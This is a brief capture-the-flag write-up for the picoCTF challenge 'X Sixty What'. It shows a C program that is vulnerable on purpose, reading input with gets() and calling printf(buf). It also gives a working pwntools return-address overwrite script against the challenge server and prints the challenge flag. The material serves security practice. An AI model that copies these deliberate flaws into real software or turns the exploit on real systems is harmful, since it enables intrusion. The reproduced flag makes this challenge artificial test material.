# X Sixty What

Simplest return overwrite, in x64!

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```
## Solution

Running the program through gdb, we can find our address to return to, and with a bit of gdb debugging, we get this program:

```python
from pwn import *

con = remote("saturn.picoctf.net", 56609)

payload = "a" * 72

payload += p64(0x000000000040123b)

con.sendline(payload)

con.interactive()
```

This gets us our flag: `picoCTF{b1663r_15_b3773r_964d9987}`